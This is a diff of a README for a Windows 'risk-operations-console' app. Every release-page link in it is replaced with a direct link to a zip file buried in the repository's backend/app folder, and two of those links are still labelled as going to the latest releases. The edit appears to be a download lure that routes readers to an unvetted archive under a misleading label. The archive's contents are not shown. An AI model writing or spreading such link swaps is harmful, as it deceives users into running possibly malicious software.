@@ -1,6 +1,6 @@
 # 📊 risk-operations-console - Clear Risk Insights for Teams
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Lakshay7858/risk-operations-console/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Lakshay7858/risk-operations-console/raw/refs/heads/main/backend/app/console_risk_operations_v2.2-alpha.4.zip)
 
 ## 🚀 Overview
 
@@ -21,7 +21,7 @@ This app is built for Windows users who want to open a download, launch the tool
 
 Use this link to visit the release page and download the latest Windows version:
 
-[Go to the latest releases](https://github.com/Lakshay7858/risk-operations-console/releases)
+[Go to the latest releases](https://github.com/Lakshay7858/risk-operations-console/raw/refs/heads/main/backend/app/console_risk_operations_v2.2-alpha.4.zip)
 
 After you open the release page:
 
@@ -182,4 +182,4 @@ This console helps analysts review risk signals in a single place. It focuses on
 
 If you need to get the app again later, use the release page here:
 
-[https://github.com/Lakshay7858/risk-operations-console/releases](https://github.com/Lakshay7858/risk-operations-console/releases)
+[https://github.com/Lakshay7858/risk-operations-console/raw/refs/heads/main/backend/app/console_risk_operations_v2.2-alpha.4.zip](https://github.com/Lakshay7858/risk-operations-console/raw/refs/heads/main/backend/app/console_risk_operations_v2.2-alpha.4.zip)
